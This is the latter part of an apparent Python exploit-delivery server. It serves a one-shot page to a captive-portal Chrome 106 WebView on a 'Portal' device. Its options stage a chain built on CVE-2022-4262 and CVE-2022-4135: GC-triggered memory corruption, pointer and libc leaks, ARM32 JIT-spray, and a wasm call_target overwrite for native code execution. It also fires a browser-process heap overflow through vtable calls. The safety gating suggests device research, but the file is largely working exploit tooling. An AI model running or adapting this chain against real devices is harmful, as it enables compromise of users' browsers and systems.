                        f"ci_mmap_rwx_class={report['ci_mmap_rwx_class']} "
                        f"ci_mmap_rw_errno={report['ci_mmap_rw_errno']} "
                        f"ci_mmap_rw_ret_fail={str(report['ci_mmap_rw_ret_fail']).lower()} "
                        f"ci_mmap_rwx_ret_fail={str(report['ci_mmap_rwx_ret_fail']).lower()} "
                        f"webgl_trigger_tramp_code_valid={str(report['webgl_trigger_tramp_code_valid']).lower()} "
                        f"webgl_trigger_tramp_direct_write={str(report['webgl_trigger_tramp_direct_write']).lower()} "
                        f"webgl_trigger_printf_valid={str(report['webgl_trigger_printf_valid']).lower()} "
                        f"webgl_trigger_mprotect_ok={str(report['webgl_trigger_mprotect_ok']).lower()} "
                        f"webgl_trigger_mprotect_result={report['webgl_trigger_mprotect_result']} "
                        f"webgl_trigger_mprotect_errno={report['webgl_trigger_mprotect_errno']} "
                        f"webgl_trigger_mmap_ok={str(report['webgl_trigger_mmap_ok']).lower()} "
                        f"webgl_trigger_mmap_errno={report['webgl_trigger_mmap_errno']} "
                        f"wasm_direct_result={report['wasm_direct_result']} "
                        f"wasm_import_result={report['wasm_import_result']} "
                        f"webgl_trigger_tramp_written={str(report['webgl_trigger_tramp_written']).lower()} "
                        f"array_length={report['array_length']} "
                        f"pressure_allocation_bytes={report['pressure_allocation_bytes']} "
                        f"pressure_allocation_calls={report['pressure_allocation_calls']} "
                        f"pressure_allocation_attempts={report['pressure_allocation_attempts']} "
                        f"pressure_allocation_failures={report['pressure_allocation_failures']} "
                        f"heap_used_start_bytes={report['heap_used_start_bytes']} "
                        f"heap_used_bytes={report['heap_used_bytes']} "
                        f"heap_limit_bytes={report['heap_limit_bytes']}",
                        flush=True,
                    )
        self.send_bytes(204, "text/plain; charset=utf-8", b"")

    def do_HEAD(self):
        self.send_bytes(204, "text/plain; charset=utf-8", b"")

    def do_PUT(self):
        self.send_bytes(405, "text/plain; charset=utf-8", b"")

    def do_DELETE(self):
        self.send_bytes(405, "text/plain; charset=utf-8", b"")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--bind", required=True, help="controlled hotspot IPv4 address")
    parser.add_argument("--port", type=int, default=80)
    mode_group = parser.add_mutually_exclusive_group()
    mode_group.add_argument(
        "--calibration-only",
        action="store_true",
        help="serve bounded allocation/finalization calibration without loading the CVE PoC",
    )
    mode_group.add_argument(
        "--single-original-gc-allocation",
        action="store_true",
        help="attempt one 0x7fe00000-byte allocation in calibration mode; may crash WebView",
    )
    mode_group.add_argument(
        "--original-gc-sequence-calibration",
        action="store_true",
        help="repeat failed original-size allocation requests up to six times; stop after the first success",
    )
    mode_group.add_argument(
        "--original-gc-trigger",
        action="store_true",
        help="run the pinned CVE page with original-size GC requests; stops after a bounded stage-1 check",
    )
    mode_group.add_argument(
        "--probe-webgl",
        action="store_true",
        help="serve a standalone WebGL capability probe (no CVE PoC): reports WebGL2 availability, GL backend (native vs ANGLE), and EXT_discard_framebuffer for the CVE-2022-4135 reachability check",
    )
    parser.add_argument(
        "--verify-rw-roundtrip",
        action="store_true",
        help="read back the restored test-object map after the pinned PoC write; requires --original-gc-trigger",
    )
    parser.add_argument(
        "--probe-arraybuffer-pointer-model",
        action="store_true",
        help="read only a self-created ArrayBuffer header to infer V8 pointer layout; requires both stage-1 gates",
    )
    parser.add_argument(
        "--probe-arraybuffer-backing-store-rw",
        action="store_true",
        help="try one reversible marker read/write in a self-created ArrayBuffer backing store; requires the prior stage-1 gates",
    )
    parser.add_argument(
        "--probe-layout",
        action="store_true",
        help="read-only leak of a JSFunction/Wasm code-pointer field (offset 0x18); requires the prior stage-1 gates",
    )
    parser.add_argument(
        "--native-getpid",
        action="store_true",
        help="JIT-spray an ARM32 getpid marker and redirect a call into it; gated on the prior stage-1 gates and on the spray landing",
    )
    parser.add_argument(
        "--spray-only",
        action="store_true",
        help="with --native-getpid, only JIT-spray and scan read-only; skip the code-pointer corruption and call",
    )
    parser.add_argument(
        "--probe-code-writable",
        action="store_true",
        help="attempt one reversible marker write into the code object to test whether the code space is writable; may crash if write-protected",
    )
    parser.add_argument(
        "--probe-libc-base",
        action="store_true",
        help="read-only leak of the isolate root and the builtin entry table to locate the V8/Chromium library; requires the prior stage-1 gates",
    )
    parser.add_argument(
        "--native-getpid-direct",
        action="store_true",
        help="deterministic direct jump to getpid: leak printf, derive getpid = printf - 0x4de94, overwrite a wasm call_target, call it, and restore; requires --probe-libc-base",
    )
    parser.add_argument(
        "--native-env-probe",
        action="store_true",
        help="Phase-5 env probe: after leaking printf, call getuid then open/read/close /proc/version via a wasm f(a,b,c)->i32 call_target overwrite, writing results to a known ArrayBuffer; requires --probe-libc-base",
    )
    parser.add_argument(
        "--probe-webgl-graph",
        action="store_true",
        help="read-only Blink object-graph walk for CVE-2022-4135 (WebGL2 context -> ScriptWrappable* -> DrawingBuffer::gl_/context_provider_); reports booleans + the drawing_buffer_ offset; requires the stage-1 gates",
    )
    parser.add_argument(
        "--probe-webgl-vtable",
        action="store_true",
        help="one vtable call to provider->ContextGL() (slot 3) to confirm it returns DrawingBuffer::gl_ — proves the vtable-call mechanism; requires --probe-webgl-graph",
    )
    parser.add_argument(
        "--probe-webgl-trigger",
        action="store_true",
        help="drive the full CVE-2022-4135 trigger (11 fresh vtable calls) to fire the browser-process TextureManager OOB; requires --probe-webgl-graph",
    )
    args = parser.parse_args()

    if args.verify_rw_roundtrip and not args.original_gc_trigger:
        parser.error("--verify-rw-roundtrip requires --original-gc-trigger")
    if args.probe_arraybuffer_pointer_model and not (
        args.original_gc_trigger and args.verify_rw_roundtrip
    ):
        parser.error(
            "--probe-arraybuffer-pointer-model requires --original-gc-trigger and --verify-rw-roundtrip"
        )
    if args.probe_arraybuffer_backing_store_rw and not (
        args.original_gc_trigger
        and args.verify_rw_roundtrip
        and args.probe_arraybuffer_pointer_model
    ):
        parser.error(
            "--probe-arraybuffer-backing-store-rw requires --original-gc-trigger, "
            "--verify-rw-roundtrip, and --probe-arraybuffer-pointer-model"
        )
    if args.probe_layout and not (
        args.original_gc_trigger
        and args.verify_rw_roundtrip
        and args.probe_arraybuffer_pointer_model
    ):
        parser.error(
            "--probe-layout requires --original-gc-trigger, "
            "--verify-rw-roundtrip, and --probe-arraybuffer-pointer-model"
        )
    if args.native_getpid and not (
        args.original_gc_trigger
        and args.verify_rw_roundtrip
        and args.probe_arraybuffer_pointer_model
    ):
        parser.error(
            "--native-getpid requires --original-gc-trigger, "
            "--verify-rw-roundtrip, and --probe-arraybuffer-pointer-model"
        )
    if args.spray_only and not args.native_getpid:
        parser.error("--spray-only requires --native-getpid")
    if args.probe_code_writable and not (
        args.original_gc_trigger
        and args.verify_rw_roundtrip
        and args.probe_arraybuffer_pointer_model
    ):
        parser.error(
            "--probe-code-writable requires --original-gc-trigger, "
            "--verify-rw-roundtrip, and --probe-arraybuffer-pointer-model"
        )
    if args.probe_libc_base and not (
        args.original_gc_trigger
        and args.verify_rw_roundtrip
        and args.probe_arraybuffer_pointer_model
    ):
        parser.error(
            "--probe-libc-base requires --original-gc-trigger, "
            "--verify-rw-roundtrip, and --probe-arraybuffer-pointer-model"
        )
    if args.native_getpid_direct and not (
        args.original_gc_trigger
        and args.verify_rw_roundtrip
        and args.probe_arraybuffer_pointer_model
        and args.probe_libc_base
    ):
        parser.error(
            "--native-getpid-direct requires --original-gc-trigger, "
            "--verify-rw-roundtrip, --probe-arraybuffer-pointer-model, "
            "and --probe-libc-base"
        )
    if args.native_env_probe and not (
        args.original_gc_trigger
        and args.verify_rw_roundtrip
        and args.probe_arraybuffer_pointer_model
        and args.probe_libc_base
    ):
        parser.error(
            "--native-env-probe requires --original-gc-trigger, "
            "--verify-rw-roundtrip, --probe-arraybuffer-pointer-model, "
            "and --probe-libc-base"
        )
    if args.probe_webgl_graph and not (
        args.original_gc_trigger
        and args.verify_rw_roundtrip
        and args.probe_arraybuffer_pointer_model
    ):
        parser.error(
            "--probe-webgl-graph requires --original-gc-trigger, "
            "--verify-rw-roundtrip, and --probe-arraybuffer-pointer-model"
        )
    if args.probe_webgl_vtable and not args.probe_webgl_graph:
        parser.error("--probe-webgl-vtable requires --probe-webgl-graph")
    if args.probe_webgl_trigger and not args.probe_webgl_graph:
        parser.error("--probe-webgl-trigger requires --probe-webgl-graph")

    try:
        bind_ip = ipaddress.IPv4Address(args.bind)
    except ipaddress.AddressValueError:
        parser.error("--bind must be a specific IPv4 address assigned to the hotspot")
    if bind_ip.is_unspecified:
        parser.error("bind to the hotspot's specific IPv4 address, not all interfaces")
    if not 1 <= args.port <= 65535:
        parser.error("--port must be between 1 and 65535")

    class ReusableTCPServer(socketserver.ThreadingTCPServer):
        allow_reuse_address = True
        daemon_threads = True

    with ReusableTCPServer((args.bind, args.port), CandidateHandler) as server:
        drop_privileges_after_bind()
        try:
            if args.probe_webgl:
                server.page = build_webgl_probe_page()
            elif args.single_original_gc_allocation:
                server.page = build_pressure_calibration_page(
                    allocation_size=ORIGINAL_GC_ALLOCATION_BYTES,
                    allocation_calls=1,
                    touch_allocation=False,
                )
            elif args.original_gc_sequence_calibration:
                server.page = build_pressure_calibration_page(
                    allocation_size=ORIGINAL_GC_ALLOCATION_BYTES,
                    allocation_calls=6,
                    touch_allocation=False,
                    continue_on_failure=True,
                    stop_after_success=True,
                )
            elif args.calibration_only:
                server.page = build_pressure_calibration_page()
            elif args.original_gc_trigger:
                server.page = build_page(
                    original_gc_trigger=True,
                    verify_rw_roundtrip=args.verify_rw_roundtrip,
                    probe_arraybuffer_pointer_model=args.probe_arraybuffer_pointer_model,
                    probe_arraybuffer_backing_store_rw=args.probe_arraybuffer_backing_store_rw,
                    probe_layout=args.probe_layout,
                    native_getpid=args.native_getpid,
                    native_execute=not args.spray_only,
                    probe_code_writable=args.probe_code_writable,
                    probe_libc_base=args.probe_libc_base,
                    native_getpid_direct=args.native_getpid_direct,
                    native_env_probe=args.native_env_probe,
                    probe_webgl_graph=args.probe_webgl_graph,
                    probe_webgl_vtable=args.probe_webgl_vtable,
                    probe_webgl_trigger=args.probe_webgl_trigger,
                )
            else:
                server.page = build_page()
        except Exception as exc:
            parser.error(f"could not prepare one-shot page: {exc}")
        server.calibration_mode = (
            args.calibration_only
            or args.single_original_gc_allocation
            or args.original_gc_sequence_calibration
        )
        if args.single_original_gc_allocation:
            server.pressure_max_bytes = ORIGINAL_GC_ALLOCATION_BYTES
            server.pressure_max_calls = 1
            server.pressure_allocation_size = ORIGINAL_GC_ALLOCATION_BYTES
            server.pressure_max_attempts = 1
        elif args.original_gc_sequence_calibration:
            server.pressure_max_bytes = ORIGINAL_GC_ALLOCATION_BYTES
            server.pressure_max_calls = 1
            server.pressure_allocation_size = ORIGINAL_GC_ALLOCATION_BYTES
            server.pressure_max_attempts = 6
        elif args.original_gc_trigger:
            server.pressure_max_bytes = ORIGINAL_GC_ALLOCATION_BYTES
            server.pressure_max_calls = 1
            server.pressure_allocation_size = ORIGINAL_GC_ALLOCATION_BYTES
            server.pressure_max_attempts = MAX_PRESSURE_ALLOCATION_CALLS
        else:
            server.pressure_max_bytes = MAX_PRESSURE_ALLOCATION_BYTES
            server.pressure_max_calls = MAX_PRESSURE_ALLOCATION_CALLS
            server.pressure_allocation_size = PRESSURE_CHUNK_BYTES
            server.pressure_max_attempts = MAX_PRESSURE_ALLOCATION_CALLS
        server.page_served = False
        server.page_client_ip = None
        server.page_user_agent = None
        server.serve_lock = threading.Lock()
        server.report_lock = threading.Lock()
        server.report_received = False
        server.rw_roundtrip_requested = args.verify_rw_roundtrip
        server.pointer_model_probe_requested = args.probe_arraybuffer_pointer_model
        server.layout_probe_requested = args.probe_layout
        server.native_getpid_requested = args.native_getpid
        server.code_writable_probe_requested = args.probe_code_writable
        server.libc_base_probe_requested = args.probe_libc_base
        server.native_getpid_direct_requested = args.native_getpid_direct
        server.native_env_probe_requested = args.native_env_probe
        server.webgl_probe_mode = args.probe_webgl
        if server.webgl_probe_mode:
            print(
                "WebGL capability probe prepared without loading the CVE PoC; "
                f"listening on http://{args.bind}:{args.port}/. It creates a WebGL2 "
                "context, reads the GL backend/vendor/renderer strings and the "
                "EXT_discard_framebuffer extension, and reports only short capability "
                "strings/booleans. This determines whether the native validating "
                "command decoder (CVE-2022-4135) or the ANGLE passthrough decoder is "
                "in use. It performs no memory writes and is served once only to the "
                "exact captured Portal Chrome 106 CaptivePortalLogin route. "
                "Ctrl-C stops the helper.",
                flush=True,
            )
        elif server.calibration_mode:
            if args.single_original_gc_allocation or args.original_gc_sequence_calibration:
                attempts_description = (
                    "up to six requests, continuing only while allocations fail and stopping after the first success"
                    if args.original_gc_sequence_calibration
                    else "one request"
                )
                print(
                    "Original-size allocation calibration prepared without loading the CVE PoC; "
                    f"listening on http://{args.bind}:{args.port}/. It makes {attempts_description} "
                    "0x7fe00000-byte ArrayBuffer (~2 GiB), without touching its pages. "
                    "This may terminate CaptivePortalLogin or reboot the Portal. It is served once only "
                    "to the exact captured Portal Chrome 106 CaptivePortalLogin route. "
                    "Ctrl-C stops the helper.",
                    flush=True,
                )
            else:
                print(
                    "Bounded allocation calibration prepared without loading the CVE PoC; "
                    f"listening on http://{args.bind}:{args.port}/. It is served once only "
                    "to the exact captured Portal Chrome 106 CaptivePortalLogin route. "
                    "A cleared WeakRef target confirms that its JS object was collected; "
                    "no observed clearance does not prove that GC did not occur. "
                    "Ctrl-C stops the helper.",
                    flush=True,
                )
        elif args.original_gc_trigger:
            print(
                "Pinned CVE-2022-4262 stage-1 page prepared with the original-size GC request; "
                f"listening on http://{args.bind}:{args.port}/. The page is served once only "
                "to the exact captured Portal Chrome 106 CaptivePortalLogin route. "
                "It makes at most six requests and allows at most one successful ~2 GiB allocation. "
                "The page stops before further address/object operations unless the 0x30 trigger marker appears; "
                "no native stage is present. This can terminate CaptivePortalLogin or reboot the Portal. "
                "Ctrl-C stops the helper.",
                flush=True,
            )
            if args.verify_rw_roundtrip:
                print(
                    "An extra readback checks the same-value map restore on the PoC's test object; "
                    "this alone does not demonstrate a changed write. Raw pointers and values are not reported.",
                    flush=True,
                )
            if args.probe_arraybuffer_pointer_model:
                print(
                    "A bounded read-only scan of a self-created 8 KiB ArrayBuffer will report only a "
                    "32/64-bit layout hint; raw pointers and contents are not reported.",
                    flush=True,
                )
            if args.probe_arraybuffer_backing_store_rw:
                print(
                    "The follow-up performs one reversible marker read/write only inside that self-created ArrayBuffer backing store; it reports booleans, restores the marker, and has no native-code stage.",
                    flush=True,
                )
            if args.probe_layout:
                print(
                    "A read-only layout probe will leak only booleans about a JSFunction and Wasm "
                    "exported function's code-pointer field (offset 0x18): pointer validity, map "
                    "validity, and whether the code object sits in a separate region. It performs no "
                    "writes and reports no raw addresses.",
                    flush=True,
                )
            if args.probe_code_writable:
                print(
                    "A code-writability probe is prepared: it performs one reversible marker write "
                    "into a hot function's code object and reads it back. If the code space is "
                    "write-protected, this will crash the WebView and no report will follow. A report "
                    "with code_writable=true means the code space is writable.",
                    flush=True,
                )
            if args.native_getpid:
                if args.spray_only:
                    print(
                        "Spray-only mode: the page will JIT-spray five ARM32 words into the RX "
                        "literal pool and scan (read-only) for them, then report native_spray_landed "
                        "and native_spray_offset. It will NOT corrupt the code field or call through it.",
                        flush=True,
                    )
                else:
                    print(
                        "A JIT-spray native getpid marker is prepared. It first JIT-sprays five ARM32 "
                        "words into the RX literal pool and scans (read-only) for them; only if the spray "
                        "lands does it corrupt a function's code field (offset 0x18) and call through it. "
                        "This is a one-shot native-execution attempt and can crash the WebView. A success "
                        "is reported as native_jump_result (the renderer PID).",
                        flush=True,
                    )
            if args.native_getpid_direct:
                print(
                    "A deterministic direct getpid jump is prepared: after leaking printf it derives "
                    "getpid = printf - 0x4de94, overwrites a wasm g()->i32 function's call_target, calls "
                    "it (the wasm wrapper returns the i32 pid as a clean JS number), then restores the "
                    "field. This is a one-shot native-execution attempt and can crash the WebView. A "
                    "success is reported as native_direct_result (the renderer PID).",
                    flush=True,
                )
            if args.native_env_probe:
                print(
                    "A Phase-5 environment probe is prepared: after leaking printf it calls "
                    "getuid (ARM) and uname (ARM, seccomp-Allowed) for the kernel "
                    "release/version/machine, then attempts open/read/close /proc/version "
                    "(expected EPERM — openat is denied by the renderer seccomp policy) and "
                    "captures that errno via __errno(). All calls go through a wasm "
                    "f(a,b,c)->i32 call_target overwrite into a known ArrayBuffer backing "
                    "store. This is a one-shot native-execution attempt and can crash the "
                    "WebView. Success is reported as env_probe_getuid_result (UID), "
                    "env_probe_version (kernel version via uname), and env_probe_open_errno.",
                    flush=True,
                )
            if args.probe_webgl_graph:
                print(
                    "A read-only Blink object-graph walk is prepared for CVE-2022-4135: it "
                    "creates a WebGL2 context, resolves the raw ScriptWrappable* from the V8 "
                    "wrapper's internal field, then walks drawing_buffer_ -> gl_/context_provider_ "
                    "and reports only booleans plus the drawing_buffer_ offset that resolved "
                    "(92=0x5C, 88=0x58, 84=0x54, -1=none). It performs no writes and no native "
                    "calls, so it is crash-safe; success is reported as webgl_native_resolved, "
                    "webgl_db_offset, and webgl_gl_prov_distinct.",
                    flush=True,
                )
            if args.probe_webgl_vtable:
                print(
                    "A vtable-call sanity check is prepared: it reads provider->vtable slot 3 "
                    "(ContextGL) and makes one indirect call through a wasm call_target overwrite, "
                    "then reports whether the return equals DrawingBuffer::gl_ (webgl_vtable_match). "
                    "This proves the ARM32 vtable-call mechanism needed to drive the CVE-2022-4135 "
                    "trigger. One native call; can crash the WebView.",
                    flush=True,
                )
            if args.probe_webgl_trigger:
                print(
                    "The full CVE-2022-4135 trigger is prepared: it drives the 11-call "
                    "SharedImageInterface/GLES2 sequence (CreateSharedImage -> "
                    "CreateAndTexStorage2DSharedImageCHROMIUM -> framebuffer-attach level 1 -> "
                    "DiscardFramebufferEXT) through 11 fresh vtable trampolines into the "
                    "browser process's validating command decoder, firing the TextureManager "
                    "heap OOB. This is a one-shot native-execution step and can crash "
                    "CaptivePortalLogin (the browser process). Success is reported as "
                    "webgl_trigger_calls_completed (11) and webgl_trigger_discard_done=true.",
                    flush=True,
                )
        else:
            print(
                f"Pinned CVE-2022-4262 page prepared with <=96 MiB allocation pressure; "
                f"listening on http://{args.bind}:{args.port}/. It is served once only "
                "to the exact captured Portal Chrome 106 CaptivePortalLogin route. "
                "The pressure counter reports allocation requests, not observed GCs. "
                "A positive result proves only a JS heap object primitive candidate, "
                "not native code execution or Android access. Ctrl-C stops the helper.",
                flush=True,
            )
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("Stopped.", flush=True)


if __name__ == "__main__":
    main()
